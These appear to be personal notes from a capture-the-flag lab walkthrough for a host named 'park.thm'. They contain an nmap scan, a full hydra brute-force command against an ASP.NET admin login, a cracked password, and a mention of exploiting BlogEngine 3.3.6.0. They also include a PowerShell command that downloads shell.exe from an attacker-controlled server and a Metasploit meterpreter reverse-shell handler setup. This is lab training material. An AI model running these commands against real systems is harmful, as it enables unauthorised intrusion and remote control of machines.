@@ -1,0 +1,57 @@
+NMAP:
+kali@kali:~/Downloads$ nmap -T4 -Pn 10.10.51.209
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 01:06 IST
+Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 8.00% done; ETC: 01:09 (0:02:07 remaining)
+Nmap scan report for park.thm (10.10.51.209)
+Host is up (0.25s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+
+
+Brute force the login form with the hydra,
+1: find the request parameter and the login url request using the burpsuite
+2:hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.21.235 http-post-form "/Account/login.aspx?ReturnURL=/admin
+to this command we need to add the cookie as well
+
+__VIEWSTATE=hcLwRKfzOgbFOa2OFdja0IiXX3A6waHLLWZjBN8ShqyQAq2cOP%2FoSC5azWDH6060iLdzzWW%2BNq6%2BR785rXjSQbqmpjL8eE3WdPLBO%2Fd14%2F4dKW%2But%2BKCQtp2EZUerKA2PxJOAJPtQpjAxqBnQWuKN%2F2c4fcw3qRYp5xNbLprHmVqUv7%2F&__EVENTVALIDATION=XcCprKGRnqKdtRBiqLwcZ7OtjVW9zl3AK6bPwhsY02hNxN1QogK0926J%2FedCVicC%2FR9Jv3Aqw%2BC%2Bl%2BNLFOsJ54x21RlNPbA3mLj9uEgW8oaNB%2FTA4rTwwx2lMYZXroL6fQOsfZyo8bSz3OTQ%2BrR97xELAP98nagFeR5DSBcL2llZx4p5&ctl00%24MainContent%24LoginUser%24UserName=fg&ctl00%24MainContent%24LoginUser%24Password=dsf&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
+
+change the user name and the password to ^USER^  & ^PASS^
+__VIEWSTATE=hcLwRKfzOgbFOa2OFdja0IiXX3A6waHLLWZjBN8ShqyQAq2cOP%2FoSC5azWDH6060iLdzzWW%2BNq6%2BR785rXjSQbqmpjL8eE3WdPLBO%2Fd14%2F4dKW%2But%2BKCQtp2EZUerKA2PxJOAJPtQpjAxqBnQWuKN%2F2c4fcw3qRYp5xNbLprHmVqUv7%2F&__EVENTVALIDATION=XcCprKGRnqKdtRBiqLwcZ7OtjVW9zl3AK6bPwhsY02hNxN1QogK0926J%2FedCVicC%2FR9Jv3Aqw%2BC%2Bl%2BNLFOsJ54x21RlNPbA3mLj9uEgW8oaNB%2FTA4rTwwx2lMYZXroL6fQOsfZyo8bSz3OTQ%2BrR97xELAP98nagFeR5DSBcL2llZx4p5&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
+
+Now add the fail condition:
+login failed
+
+finally:
+hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.51.209  http-post-form  "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=hcLwRKfzOgbFOa2OFdja0IiXX3A6waHLLWZjBN8ShqyQAq2cOP%2FoSC5azWDH6060iLdzzWW%2BNq6%2BR785rXjSQbqmpjL8eE3WdPLBO%2Fd14%2F4dKW%2But%2BKCQtp2EZUerKA2PxJOAJPtQpjAxqBnQWuKN%2F2c4fcw3qRYp5xNbLprHmVqUv7%2F&__EVENTVALIDATION=XcCprKGRnqKdtRBiqLwcZ7OtjVW9zl3AK6bPwhsY02hNxN1QogK0926J%2FedCVicC%2FR9Jv3Aqw%2BC%2Bl%2BNLFOsJ54x21RlNPbA3mLj9uEgW8oaNB%2FTA4rTwwx2lMYZXroL6fQOsfZyo8bSz3OTQ%2BrR97xELAP98nagFeR5DSBcL2llZx4p5&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:login failed" -vv
+
+We FIND:
+usename :admin
+password: 1qaz2wsx
+
+
+WE find the site is using the 
+BlogEngine  3.3.6.0  
+we also find that this is a vulnerable version.
+
+Now after following the steps in the exploit file , we  have the reverse shell(windows)
+
+Now we will use the msfvenom from the metasploit to make a new corrosponnding shell::
+a: create a windows reverse shell excicutable:
+a: transfer it to our local machine:::
+    1: create a python severe::::  sudo python3 -m http.server 81
+    2: to download the file , we can use the Powershell :- Invoke-Webshell command in the temp directory:
+	3: On the target machine:
+	a/::  cd  C:\windows\temp
+    b/::  C:\Windows\Temp>powershell -c "Invoke-WebRequest -Uri 
+    'http://10.21.129.108:81/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
+     c/:: run metasploit on the new tab
+      use exploit/multi/handler
+       msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+	   msf6 exploit(multi/handler) > set LHOST 10.21.129.108
+      run:
+	  we have our meterpreter session:
+	  
+	
